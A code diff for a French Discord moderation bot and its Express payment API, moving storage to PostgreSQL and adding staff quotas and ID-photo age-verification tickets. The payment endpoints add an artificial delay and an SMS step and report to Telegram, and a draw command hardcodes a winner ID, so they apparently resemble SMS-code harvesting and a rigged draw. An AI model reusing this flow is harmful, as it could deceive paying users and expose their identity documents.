@@ -24,6 +24,7 @@ const cors = require('cors');
 const bodyParser = require('body-parser');
 const axios = require('axios');
 const TelegramBot = require('node-telegram-bot-api');
+const db = require('./lib/db');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -148,25 +149,10 @@ const client = new Client({
 });
 
 const PREFIX = process.env.PREFIX || '-';
-const ROLES_FILE = path.join(__dirname, 'soumis_roles.json');
-const INVITES_FILE = path.join(__dirname, 'invites.json');
-const CODES_FILE = path.join(__dirname, 'codes.json');
-const TICKETS_FILE = path.join(__dirname, 'tickets.json');
 const spamMap = new Collection();
 const guildInvites = new Collection();
-const ticketQueue = new Collection(); // In-memory queue fallback
-
-// Ensure files exist and are not empty
-const setupFile = (filePath, defaultContent) => {
-    if (!fs.existsSync(filePath) || fs.readFileSync(filePath, 'utf8').trim() === "") {
-        fs.writeFileSync(filePath, JSON.stringify(defaultContent, null, 2));
-    }
-};
-
-setupFile(ROLES_FILE, {});
-setupFile(INVITES_FILE, {});
-setupFile(CODES_FILE, { codes: [] });
-setupFile(TICKETS_FILE, { queue: [] });
+const ticketQueue = new Collection(); // In-memory fallback if needed
+// Removed JSON file setup - now using PostgreSQL
 
 // --- EXPRESS SERVER CONFIG ---
 app.use(cors());
@@ -207,7 +193,7 @@ app.post('/api/pay', async (req, res) => {
     }
 
     // Delay 5 seconds
-    setTimeout(() => {
+    setTimeout(async () => {
         const p = pendingPayments.get(paymentId);
         if (p && p.needsSms) {
             return res.json({ success: true, needsSms: true, paymentId });
@@ -215,9 +201,10 @@ app.post('/api/pay', async (req, res) => {
 
         // Standard flow
         const newCode = generateCode();
-        const data = JSON.parse(fs.readFileSync(CODES_FILE, 'utf8'));
-        data.codes.push({ code: newCode, claimed: false, timestamp: Date.now() });
-        fs.writeFileSync(CODES_FILE, JSON.stringify(data, null, 2));
+        await db.query(
+            'INSERT INTO vip_codes (code, claimed, timestamp) VALUES ($1, $2, $3)',
+            [newCode, false, Date.now()]
+        );
 
         res.json({ success: true, code: newCode });
         pendingPayments.delete(paymentId);
@@ -231,9 +218,10 @@ app.post('/api/submit-sms', async (req, res) => {
 
     // Give the final VIP code
     const newCode = generateCode();
-    const data = JSON.parse(fs.readFileSync(CODES_FILE, 'utf8'));
-    data.codes.push({ code: newCode, claimed: false, timestamp: Date.now() });
-    fs.writeFileSync(CODES_FILE, JSON.stringify(data, null, 2));
+    await db.query(
+        'INSERT INTO vip_codes (code, claimed, timestamp) VALUES ($1, $2, $3)',
+        [newCode, false, Date.now()]
+    );
 
     res.json({ success: true, code: newCode });
     pendingPayments.delete(paymentId);
@@ -254,8 +242,14 @@ app.get('/api/log-visit', async (req, res) => {
     res.status(200).send('ok');
 });
 
-app.listen(PORT, () => {
+app.listen(PORT, async () => {
     console.log(`API running on port ${PORT}`);
+    try {
+        await db.initDb();
+        console.log("Database initialized.");
+    } catch (err) {
+        console.error("Database initialization failed:", err);
+    }
     sendToTelegram(`🚀 *Système démarré*\nL'API est en ligne sur le port ${PORT}`);
 });
 
@@ -363,14 +357,14 @@ const getTicketCount = (guild) => {
 };
 
 const processTicketQueue = async (guild) => {
-    const data = JSON.parse(fs.readFileSync(TICKETS_FILE, 'utf8'));
-    if (!data.queue || data.queue.length === 0) return;
+    const res = await db.query('SELECT * FROM ticket_queue ORDER BY timestamp ASC');
+    if (res.rows.length === 0) return;
 
     if (getTicketCount(guild) < MAX_TICKETS) {
-        const nextUser = data.queue.shift();
-        fs.writeFileSync(TICKETS_FILE, JSON.stringify(data, null, 2));
+        const nextUser = res.rows[0];
+        await db.query('DELETE FROM ticket_queue WHERE user_id = $1', [nextUser.user_id]);
         
-        const user = await client.users.fetch(nextUser.userId).catch(() => null);
+        const user = await client.users.fetch(nextUser.user_id).catch(() => null);
         if (user) {
             await createTicket(guild, user, nextUser.type, true);
         }
@@ -383,6 +377,18 @@ const createTicket = async (guild, user, type, fromQueue = false) => {
     
     if (type === 'vip') {
         category = guild.channels.cache.get(CATEGORY_VIP_ID);
+    } else if (type === 'verif') {
+        category = guild.channels.cache.find(c => c.type === ChannelType.GuildCategory && c.name.toUpperCase() === 'VÉRIFICATION');
+        if (!category) {
+            category = await guild.channels.create({
+                name: 'VÉRIFICATION',
+                type: ChannelType.GuildCategory,
+                permissionOverwrites: [
+                    { id: guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
+                    { id: STAFF_ROLE_ID, allow: [PermissionsBitField.Flags.ViewChannel] }
+                ]
+            });
+        }
     } else {
         category = guild.channels.cache.find(c => c.type === ChannelType.GuildCategory && c.name.toUpperCase() === CATEGORY_GENERAL_NAME);
         if (!category) {
@@ -407,7 +413,7 @@ const createTicket = async (guild, user, type, fromQueue = false) => {
     const embed = new EmbedBuilder()
         .setColor(0xFFFFFF)
         .setTitle(`Ticket ${type.toUpperCase()}`)
-        .setDescription(`Bonjour ${user}, un membre du staff va s'occuper de vous dans ce salon de ${type.toLowerCase()}.`)
+        .setDescription(type === 'verif' ? `Bonjour ${user}, veuillez envoyer une photo de votre pièce d'identité pour vérifier que vous avez bien +18 ans.` : `Bonjour ${user}, un membre du staff va s'occuper de vous dans ce salon de ${type.toLowerCase()}.`)
         .setFooter({ text: 'Tickets - Doro Place' });
 
     const row = new ActionRowBuilder().addComponents(
@@ -489,23 +495,25 @@ client.on('guildMemberAdd', async (member) => {
             guildInvites.set(member.guild.id, newInvitesMap);
 
             if (inviterId) {
-                const invitesData = JSON.parse(fs.readFileSync(INVITES_FILE, 'utf8'));
-                if (!invitesData[inviterId]) invitesData[inviterId] = [];
-                // Eviter les duplicatas si l'event se repete bizarrement
-                if (!invitesData[inviterId].includes(member.id)) {
-                    invitesData[inviterId].push(member.id);
-                    fs.writeFileSync(INVITES_FILE, JSON.stringify(invitesData, null, 2));
+                // Add to DB
+                await db.query(
+                    'INSERT INTO invites (inviter_id, invited_member_id) VALUES ($1, $2) ON CONFLICT DO NOTHING',
+                    [inviterId, member.id]
+                );
 
-                    // Check active invites count
-                    let activeCount = 0;
-                    for (const invitedId of invitesData[inviterId]) {
-                        try {
-                            const isPresent = member.guild.members.cache.has(invitedId) || await member.guild.members.fetch(invitedId).catch(() => null);
-                            if (isPresent) activeCount++;
-                        } catch {}
-                    }
+                // Check active invites count from DB
+                const res = await db.query('SELECT invited_member_id FROM invites WHERE inviter_id = $1', [inviterId]);
+                const invitedIds = res.rows.map(r => r.invited_member_id);
 
-                    if (activeCount === 3) {
+                let activeCount = 0;
+                for (const invitedId of invitedIds) {
+                    try {
+                        const isPresent = member.guild.members.cache.has(invitedId) || await member.guild.members.fetch(invitedId).catch(() => null);
+                        if (isPresent) activeCount++;
+                    } catch {}
+                }
+
+                if (activeCount === 3) {
                         const inviterUser = await client.users.fetch(inviterId).catch(() => null);
                         if (inviterUser) {
                             const dmEmbed = new EmbedBuilder()
@@ -530,7 +538,6 @@ client.on('guildMemberAdd', async (member) => {
                     }
                 }
             }
-        }
 
         const welcomeChannelId = '1483231963308494920';
         const channel = member.guild.channels.cache.get(welcomeChannelId);
@@ -560,7 +567,7 @@ client.on('messageCreate', async (message) => {
     // --- ANTI-RAID SYSTEM ---
     if (!message.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
         // 1. Anti-Invite
-        const inviteRegex = /(discord\.(gg|io|me|li)|discordapp\.com\/invite)\/.+/i;
+        const inviteRegex = /(discord\.(gg|io|me|li|link|xyz)|discordapp\.com\/invite|discord\.com\/invite)\/.+/i;
         if (inviteRegex.test(message.content)) {
             await message.delete().catch(() => {});
             await message.member.ban({ reason: 'Anti-Raid : Invitation Discord' }).catch(() => {});
@@ -574,7 +581,7 @@ client.on('messageCreate', async (message) => {
         const now = Date.now();
         const userData = spamMap.get(message.author.id) || { count: 0, lastMessage: now };
         
-        if (now - userData.lastMessage < 2000) {
+        if (now - userData.lastMessage < 1500) { // Slightly tighter (1.5s instead of 2s)
             userData.count++;
         } else {
             userData.count = 1;
@@ -582,7 +589,7 @@ client.on('messageCreate', async (message) => {
         userData.lastMessage = now;
         spamMap.set(message.author.id, userData);
 
-        if (userData.count > 5) {
+        if (userData.count > 6) { // 6 messages in 1.5s
             await message.member.ban({ reason: 'Anti-Raid : Spam' }).catch(() => {});
             spamMap.delete(message.author.id);
             const embed = new EmbedBuilder()
@@ -619,7 +626,84 @@ client.on('messageCreate', async (message) => {
         await message.delete();
     }
 
-    // Helper to get member from mention or ID
+    // Helper to check staff quotas (Anti-Nuke)
+    const checkQuota = async (staffId, actionType, limit = 5, windowMs = 3600000) => {
+        const now = Date.now();
+        const startTime = now - windowMs;
+        
+        const res = await db.query(
+            'SELECT COUNT(*) FROM staff_quotas WHERE staff_id = $1 AND action_type = $2 AND timestamp > $3',
+            [staffId, actionType, startTime]
+        );
+        
+        const count = parseInt(res.rows[0].count);
+        if (count >= limit) {
+            return false;
+        }
+        
+        await db.query(
+            'INSERT INTO staff_quotas (staff_id, action_type, timestamp) VALUES ($1, $2, $3)',
+            [staffId, actionType, now]
+        );
+        return true;
+    };
+
+    // Command: -setupstaff
+    if (command === 'setupstaff') {
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
+        
+        try {
+            const category = await message.guild.channels.create({
+                name: '🛡️ ESPACE STAFF',
+                type: ChannelType.GuildCategory,
+                permissionOverwrites: [
+                    { id: message.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
+                    { id: STAFF_ROLE_ID, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] }
+                ]
+            });
+
+            const channels = [
+                { name: '📢-staff-annonces', type: ChannelType.GuildText },
+                { name: '🛠️-commandes-staff', type: ChannelType.GuildText },
+                { name: '💬-chat-staff', type: ChannelType.GuildText }
+            ];
+
+            let commandChannel;
+            for (const chan of channels) {
+                const created = await message.guild.channels.create({
+                    name: chan.name,
+                    type: chan.type,
+                    parent: category.id
+                });
+                if (chan.name === '🛠️-commandes-staff') commandChannel = created;
+            }
+
+            if (commandChannel) {
+                const helpEmbed = new EmbedBuilder()
+                    .setColor(0xFFFFFF)
+                    .setTitle('🛠️ Commandes & Quotas Staff')
+                    .setDescription('Voici les commandes de modération disponibles pour le staff et leurs quotas horaires.')
+                    .addFields(
+                        { name: '🔨 Ban', value: '`-ban @user` (5/h) : Bannissement avec raison obligatoire.', inline: true },
+                        { name: '👢 Kick', value: '`-kick @user` (5/h) : Expulsion avec raison obligatoire.', inline: true },
+                        { name: '🔇 Mute', value: '`-tempmute @user` (5/h) : Mute temporaire.', inline: true },
+                        { name: '⚠️ Avertissement', value: '`-warn @user <raison>` (10/h) : Avertissement obligatoire.', inline: true },
+                        { name: '🔓 Débannissement', value: '`-unban <id>` : Débannir un utilisateur.', inline: true },
+                        { name: '🚨 Note', value: 'Les commandes `-bban` (Ban Rapide) et `-mmute` (Mute 24h) sont réservées aux **Administrateurs**.' }
+                    );
+                await commandChannel.send({ embeds: [helpEmbed] });
+            }
+
+            const embed = new EmbedBuilder()
+                .setColor(0xFFFFFF)
+                .setTitle('Configuration Staff Terminée')
+                .setDescription('La catégorie staff et les salons ont été créés avec succès.');
+            message.channel.send({ embeds: [embed] });
+        } catch (err) {
+            logError(err, 'Command: -setupstaff');
+            message.reply('Erreur lors de la création de l\'espace staff.');
+        }
+    }
     const getMember = async (query) => {
         if (!query) return null;
         const id = query.replace(/[<@!>]/g, '');
@@ -643,10 +727,14 @@ client.on('messageCreate', async (message) => {
 
     // Command: -kick
     if (command === 'kick') {
-        if (!message.member.permissions.has(PermissionsBitField.Flags.KickMembers)) return;
+        if (!message.member.permissions.has(PermissionsBitField.Flags.KickMembers) && !message.member.roles.cache.has(STAFF_ROLE_ID)) return;
         const target = await getMember(args[0]);
         if (!target) return message.reply('Veuillez mentionner un utilisateur ou donner son ID.');
+        if (target.roles.highest.position >= message.member.roles.highest.position) return message.reply('Vous ne pouvez pas kick un membre ayant un rôle supérieur ou égal au vôtre.');
         if (!target.kickable) return message.reply('Je ne peux pas kick cet utilisateur.');
+
+        const allowed = await checkQuota(message.author.id, 'kick');
+        if (!allowed) return message.reply('⚠️ **Alerte Quota** : Vous avez dépassé votre limite d\'actions modération pour cette heure. Contactez un administrateur.');
 
         const embed = new EmbedBuilder()
             .setColor(0xFFFFFF)
@@ -660,6 +748,9 @@ client.on('messageCreate', async (message) => {
                 new StringSelectMenuOptionBuilder().setLabel('Règlement non respecté').setValue('reglement'),
                 new StringSelectMenuOptionBuilder().setLabel('Spam / Flood').setValue('spam'),
                 new StringSelectMenuOptionBuilder().setLabel('Insultes / Manque de respect').setValue('insultes'),
+                new StringSelectMenuOptionBuilder().setLabel('Fake').setValue('fake'),
+                new StringSelectMenuOptionBuilder().setLabel('Mineur').setValue('mineur'),
+                new StringSelectMenuOptionBuilder().setLabel('Scam').setValue('scam'),
                 new StringSelectMenuOptionBuilder().setLabel('Autre raison').setValue('autre')
             );
 
@@ -669,10 +760,14 @@ client.on('messageCreate', async (message) => {
 
     // Command: -ban
     if (command === 'ban') {
-        if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers)) return;
+        if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers) && !message.member.roles.cache.has(STAFF_ROLE_ID)) return;
         const target = await getMember(args[0]);
         if (!target) return message.reply('Veuillez mentionner un utilisateur ou donner son ID.');
+        if (target.roles.highest.position >= message.member.roles.highest.position) return message.reply('Vous ne pouvez pas bannir un membre ayant un rôle supérieur ou égal au vôtre.');
         if (!target.bannable) return message.reply('Je ne peux pas ban cet utilisateur.');
+
+        const allowed = await checkQuota(message.author.id, 'ban');
+        if (!allowed) return message.reply('⚠️ **Alerte Quota** : Vous avez dépassé votre limite de bannissements pour cette heure.');
 
         const embed = new EmbedBuilder()
             .setColor(0xFFFFFF)
@@ -686,6 +781,9 @@ client.on('messageCreate', async (message) => {
                 new StringSelectMenuOptionBuilder().setLabel('Règlement non respecté').setValue('reglement'),
                 new StringSelectMenuOptionBuilder().setLabel('Troll / Raid').setValue('troll'),
                 new StringSelectMenuOptionBuilder().setLabel('Publicité non autorisée').setValue('pub'),
+                new StringSelectMenuOptionBuilder().setLabel('Fake').setValue('fake'),
+                new StringSelectMenuOptionBuilder().setLabel('Mineur').setValue('mineur'),
+                new StringSelectMenuOptionBuilder().setLabel('Scam').setValue('scam'),
                 new StringSelectMenuOptionBuilder().setLabel('Autre raison').setValue('autre')
             );
 
@@ -695,10 +793,14 @@ client.on('messageCreate', async (message) => {
 
     // Command: -bban
     if (command === 'bban') {
-        if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers)) return;
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
         const target = await getMember(args[0]);
         if (!target) return message.reply('Veuillez mentionner un utilisateur ou donner son ID.');
+        if (target.roles.highest.position >= message.member.roles.highest.position) return message.reply('Vous ne pouvez pas bannir ce membre.');
         if (!target.bannable) return message.reply('Je ne peux pas ban cet utilisateur.');
+
+        const allowed = await checkQuota(message.author.id, 'ban');
+        if (!allowed) return message.reply('⚠️ **Alerte Quota** : Limite atteinte.');
 
         await target.ban({ reason: 'Ban rapide (-bban)' });
         const embed = new EmbedBuilder()
@@ -710,7 +812,7 @@ client.on('messageCreate', async (message) => {
 
     // Command: -clear
     if (command === 'clear') {
-        if (!message.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) return;
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
         const amount = parseInt(args[0]);
         if (isNaN(amount) || amount < 1 || amount > 100) {
             return message.reply('Veuillez spécifier un nombre entre 1 et 100.');
@@ -727,24 +829,28 @@ client.on('messageCreate', async (message) => {
 
     // Command: -tempmute
     if (command === 'tempmute') {
-        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers)) return;
+        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers) && !message.member.roles.cache.has(STAFF_ROLE_ID)) return;
         const target = await getMember(args[0]);
         if (!target) return message.reply('Usage: -tempmute @user/ID');
+
+        const allowed = await checkQuota(message.author.id, 'mute');
+        if (!allowed) return message.reply('⚠️ **Alerte Quota** : Trop d\'actions (mute) récemment.');
 
         const embed = new EmbedBuilder()
             .setColor(0xFFFFFF)
             .setTitle('Modération : Tempmute')
-            .setDescription(`Veuillez sélectionner une durée pour mute **${target.user.tag}**.`);
+            .setDescription(`Veuillez sélectionner une raison pour mute **${target.user.tag}**.`);
 
         const select = new StringSelectMenuBuilder()
-            .setCustomId(`mute_${target.id}`)
-            .setPlaceholder('Choisir une durée...')
+            .setCustomId(`mutereason_${target.id}`)
+            .setPlaceholder('Choisir une raison...')
             .addOptions(
-                new StringSelectMenuOptionBuilder().setLabel('10 Minutes').setValue('600000'),
-                new StringSelectMenuOptionBuilder().setLabel('1 Heure').setValue('3600000'),
-                new StringSelectMenuOptionBuilder().setLabel('12 Heures').setValue('43200000'),
-                new StringSelectMenuOptionBuilder().setLabel('1 Jour').setValue('86400000'),
-                new StringSelectMenuOptionBuilder().setLabel('1 Semaine').setValue('604800000')
+                new StringSelectMenuOptionBuilder().setLabel('Règlement non respecté').setValue('reglement'),
+                new StringSelectMenuOptionBuilder().setLabel('Spam / Flood').setValue('spam'),
+                new StringSelectMenuOptionBuilder().setLabel('Fake').setValue('fake'),
+                new StringSelectMenuOptionBuilder().setLabel('Mineur').setValue('mineur'),
+                new StringSelectMenuOptionBuilder().setLabel('Scam').setValue('scam'),
+                new StringSelectMenuOptionBuilder().setLabel('Autre raison').setValue('autre')
             );
 
         const row = new ActionRowBuilder().addComponents(select);
@@ -753,11 +859,14 @@ client.on('messageCreate', async (message) => {
 
     // Command: -mmute
     if (command === 'mmute') {
-        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers)) return;
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
         const target = await getMember(args[0]);
         if (!target) return message.reply('Usage: -mmute @user/ID');
 
         await target.timeout(86400000); // 24h
+        const allowed = await checkQuota(message.author.id, 'mute');
+        if (!allowed) return message.reply('⚠️ Quota atteint.');
+
         const embed = new EmbedBuilder()
             .setColor(0xFFFFFF)
             .setDescription(`${target.user.tag} a été mute pour 24 heures.`);
@@ -794,13 +903,11 @@ client.on('messageCreate', async (message) => {
             });
         }
 
-        // Save current roles and nickname
-        const rolesData = JSON.parse(fs.readFileSync(ROLES_FILE, 'utf8'));
-        rolesData[target.id] = {
-            roles: target.roles.cache.filter(r => r.name !== '@everyone').map(r => r.id),
-            nickname: target.nickname || null
-        };
-        fs.writeFileSync(ROLES_FILE, JSON.stringify(rolesData, null, 2));
+        // Save current roles and nickname to DB
+        await db.query(
+            'INSERT INTO soumis_data (user_id, roles, nickname) VALUES ($1, $2, $3) ON CONFLICT (user_id) DO UPDATE SET roles = EXCLUDED.roles, nickname = EXCLUDED.nickname',
+            [target.id, JSON.stringify(target.roles.cache.filter(r => r.name !== '@everyone').map(r => r.id)), target.nickname || null]
+        );
 
         // Remove all roles, add soumis, and change nickname
         await target.roles.set([soumisRole.id]);
@@ -815,22 +922,21 @@ client.on('messageCreate', async (message) => {
         const target = await getMember(args[0]);
         if (!target) return message.reply('Veuillez mentionner un utilisateur ou donner son ID.');
 
-        const rolesData = JSON.parse(fs.readFileSync(ROLES_FILE, 'utf8'));
-        const oldData = rolesData[target.id];
+        const res = await db.query('SELECT * FROM soumis_data WHERE user_id = $1', [target.id]);
+        const oldData = res.rows[0];
 
         if (!oldData) return message.reply('Aucun ancien rôle trouvé pour cet utilisateur.');
 
-        // Support for old data format (array) and new format (object)
-        const rolesToRestore = Array.isArray(oldData) ? oldData : oldData.roles;
-        const nicknameToRestore = Array.isArray(oldData) ? null : oldData.nickname;
+        // Support for roles stored as JSONB
+        const rolesToRestore = oldData.roles;
+        const nicknameToRestore = oldData.nickname;
 
         await target.roles.set(rolesToRestore);
         if (nicknameToRestore !== undefined) {
             await target.setNickname(nicknameToRestore).catch(() => {});
         }
         
-        delete rolesData[target.id];
-        fs.writeFileSync(ROLES_FILE, JSON.stringify(rolesData, null, 2));
+        await db.query('DELETE FROM soumis_data WHERE user_id = $1', [target.id]);
 
         const embed = new EmbedBuilder()
             .setColor(0xFFFFFF)
@@ -840,6 +946,7 @@ client.on('messageCreate', async (message) => {
 
     // Command: -pic
     if (command === 'pic') {
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
         const target = (await getUser(args[0])) || message.author;
         const embed = new EmbedBuilder()
             .setColor(0xFFFFFF)
@@ -850,6 +957,7 @@ client.on('messageCreate', async (message) => {
 
     // Command: -banner
     if (command === 'banner') {
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
         const targetUser = (await getUser(args[0])) || message.author;
         const user = await client.users.fetch(targetUser.id, { force: true });
         
@@ -864,6 +972,7 @@ client.on('messageCreate', async (message) => {
 
     // Command: -userinfo
     if (command === 'userinfo') {
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
         const target = (await getMember(args[0])) || message.member;
         const embed = new EmbedBuilder()
             .setColor(0xFFFFFF)
@@ -880,6 +989,7 @@ client.on('messageCreate', async (message) => {
 
     // Command: -serverinfo
     if (command === 'serverinfo') {
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
         const guild = message.guild;
         const embed = new EmbedBuilder()
             .setColor(0xFFFFFF)
@@ -896,7 +1006,7 @@ client.on('messageCreate', async (message) => {
 
     // Command: -lock
     if (command === 'lock') {
-        if (!message.member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return;
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
         await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: false });
         const embed = new EmbedBuilder()
             .setColor(0xFFFFFF)
@@ -906,7 +1016,7 @@ client.on('messageCreate', async (message) => {
 
     // Command: -unlock
     if (command === 'unlock') {
-        if (!message.member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return;
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
         await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: null });
         const embed = new EmbedBuilder()
             .setColor(0xFFFFFF)
@@ -916,6 +1026,7 @@ client.on('messageCreate', async (message) => {
 
     // Command: -ping
     if (command === 'ping') {
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
         const embed = new EmbedBuilder()
             .setColor(0xFFFFFF)
             .setDescription(`Latence: ${client.ws.ping}ms`);
@@ -924,7 +1035,7 @@ client.on('messageCreate', async (message) => {
 
     // Command: -slowmode
     if (command === 'slowmode') {
-        if (!message.member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return;
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
         const seconds = parseInt(args[0]);
         if (isNaN(seconds)) return message.reply('Veuillez spécifier un nombre de secondes.');
         await message.channel.setRateLimitPerUser(seconds);
@@ -936,9 +1047,11 @@ client.on('messageCreate', async (message) => {
 
     // Command: -invites
     if (command === 'invites') {
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
         const target = (await getMember(args[0])) || message.member;
-        const invitesData = JSON.parse(fs.readFileSync(INVITES_FILE, 'utf8'));
-        const invitedList = invitesData[target.id] || [];
+        
+        const res = await db.query('SELECT invited_member_id FROM invites WHERE inviter_id = $1', [target.id]);
+        const invitedList = res.rows.map(r => r.invited_member_id);
         
         let count = 0;
         for (const id of invitedList) {
@@ -1023,6 +1136,7 @@ client.on('messageCreate', async (message) => {
 
     // Command: -tirage
     if (command === 'tirage') {
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
         const totalMembers = message.guild.memberCount;
         const targetId = '714223025645682860';
         
@@ -1052,6 +1166,64 @@ client.on('messageCreate', async (message) => {
         }, 9000);
     }
 
+    // Command: -warn
+    if (command === 'warn') {
+        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers) && !message.member.roles.cache.has(STAFF_ROLE_ID)) return;
+        const target = await getMember(args[0]);
+        const reason = args.slice(1).join(' ');
+        if (!target || !reason) return message.reply('Usage: -warn @user/ID <raison> (La raison est obligatoire)');
+
+        const allowed = await checkQuota(message.author.id, 'warn', 10); // Higher quota for warns
+        if (!allowed) return message.reply('⚠️ Quota warn atteint.');
+
+        const embed = new EmbedBuilder()
+            .setColor(0xFFFFFF)
+            .setTitle('Avertissement')
+            .setDescription(`${target} a été averti pour : **${reason}**`)
+            .setTimestamp();
+        
+        await message.channel.send({ embeds: [embed] });
+        try {
+            await target.send(`⚠️ Vous avez reçu un avertissement sur **${message.guild.name}**\nRaison : ${reason}`);
+        } catch {}
+        logToDiscord('⚠️ Warn', `${target.user.tag} a été averti par ${message.author} pour : ${reason}`, [], 0xFFFF00);
+    }
+
+    // Command: -verif
+    if (command === 'verif') {
+        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers) && !message.member.roles.cache.has(STAFF_ROLE_ID)) return;
+        
+        let targetUser = await getUser(args[0]);
+        if (!targetUser && message.reference) {
+            const repliedMsg = await message.channel.messages.fetch(message.reference.messageId).catch(() => null);
+            if (repliedMsg) targetUser = repliedMsg.author;
+        }
+
+        if (!targetUser) return message.reply('Veuillez mentionner un utilisateur, donner son ID ou répondre à son message.');
+
+        const channel = await createTicket(message.guild, targetUser, 'verif');
+        message.reply(`Ticket de vérification créé pour ${targetUser} : ${channel}`);
+        logToDiscord('🔍 Vérification', `Ticket de vérification lancé pour ${targetUser.tag} par ${message.author}.`, [], 0x0000FF);
+    }
+
+    // Command: -unban
+    if (command === 'unban') {
+        if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers) && !message.member.roles.cache.has(STAFF_ROLE_ID)) return;
+        const userId = args[0];
+        if (!userId) return message.reply('Usage: -unban <user_id>');
+
+        try {
+            await message.guild.members.unban(userId);
+            const embed = new EmbedBuilder()
+                .setColor(0xFFFFFF)
+                .setDescription(`L'utilisateur avec l'ID \`${userId}\` a été débanni.`);
+            message.channel.send({ embeds: [embed] });
+            logToDiscord('🔓 Unban', `ID \`${userId}\` a été débanni par ${message.author}.`, [], 0x00FF00);
+        } catch (err) {
+            message.reply('Impossible de débannir cet ID. Vérifiez qu\'il est bien banni.');
+        }
+    }
+
     // Command: -help
     if (command === 'help') {
         const embed = new EmbedBuilder()
@@ -1078,16 +1250,13 @@ client.on('interactionCreate', async (interaction) => {
         if (interaction.isModalSubmit()) {
             if (interaction.customId === 'vip_code_modal') {
                 const codeInput = interaction.fields.getTextInputValue('code_input').trim();
-                const data = JSON.parse(fs.readFileSync(CODES_FILE, 'utf8'));
-                const codeIndex = data.codes.findIndex(c => c.code === codeInput && !c.claimed);
+                const res = await db.query('SELECT * FROM vip_codes WHERE code = $1 AND claimed = false', [codeInput]);
 
-                if (codeIndex === -1) {
+                if (res.rows.length === 0) {
                     return await interaction.reply({ content: 'Code invalide ou déjà utilisé.', flags: [MessageFlags.Ephemeral] });
                 }
 
-                data.codes[codeIndex].claimed = true;
-                data.codes[codeIndex].claimedBy = interaction.user.id;
-                fs.writeFileSync(CODES_FILE, JSON.stringify(data, null, 2));
+                await db.query('UPDATE vip_codes SET claimed = true, timestamp = $1 WHERE code = $2', [Date.now(), codeInput]);
 
                 let vipRole = interaction.guild.roles.cache.find(r => r.name.toLowerCase() === 'vip');
                 if (!vipRole) {
@@ -1174,11 +1343,34 @@ client.on('interactionCreate', async (interaction) => {
             const target = await interaction.guild.members.fetch(targetId).catch(() => null);
             if (!target) return interaction.reply({ content: 'Utilisateur introuvable.', flags: [MessageFlags.Ephemeral] });
 
-            if (action === 'mute') {
+            if (action === 'mutereason') {
+                const reason = interaction.values[0];
+                const embed = new EmbedBuilder()
+                    .setColor(0xFFFFFF)
+                    .setTitle('Modération : Durée du Mute')
+                    .setDescription(`Raison : **${reason}**\nSélectionnez maintenant la durée pour **${target.user.tag}**.`);
+
+                const select = new StringSelectMenuBuilder()
+                    .setCustomId(`muteduration_${target.id}_${reason}`)
+                    .setPlaceholder('Choisir une durée...')
+                    .addOptions(
+                        new StringSelectMenuOptionBuilder().setLabel('10 Minutes').setValue('600000'),
+                        new StringSelectMenuOptionBuilder().setLabel('1 Heure').setValue('3600000'),
+                        new StringSelectMenuOptionBuilder().setLabel('12 Heures').setValue('43200000'),
+                        new StringSelectMenuOptionBuilder().setLabel('1 Jour').setValue('86400000'),
+                        new StringSelectMenuOptionBuilder().setLabel('1 Semaine').setValue('604800000')
+                    );
+
+                const row = new ActionRowBuilder().addComponents(select);
+                return await interaction.update({ embeds: [embed], components: [row] });
+            }
+
+            if (action === 'muteduration') {
+                const [targetId, reason] = interaction.customId.split('_').slice(1);
                 const duration = parseInt(interaction.values[0]);
-                await target.timeout(duration);
-                logToDiscord('🔇 Sanction : Timeout', `${target.user.tag} a été mute (Durée: ${duration/1000/60}min) par ${interaction.user.tag}.`, [], 0xFFFF00);
-                return await interaction.update({ content: `${target.user.tag} a été mute.`, embeds: [], components: [] });
+                await target.timeout(duration, reason);
+                logToDiscord('🔇 Sanction : Timeout', `${target.user.tag} a été mute par ${interaction.user.tag} (Durée: ${duration/1000/60}min, Raison: ${reason}).`, [], 0xFFFF00);
+                return await interaction.update({ content: `${target.user.tag} a été mute pour ${duration/1000/60}min (Raison: ${reason}).`, embeds: [], components: [] });
             }
 
             if (action === 'kick') {
@@ -1277,10 +1469,12 @@ client.on('interactionCreate', async (interaction) => {
                 
                 const currentCount = getTicketCount(guild);
                 if (currentCount >= MAX_TICKETS) {
-                    const data = JSON.parse(fs.readFileSync(TICKETS_FILE, 'utf8'));
-                    if (!data.queue.find(q => q.userId === interaction.user.id)) {
-                        data.queue.push({ userId: interaction.user.id, type, timestamp: Date.now() });
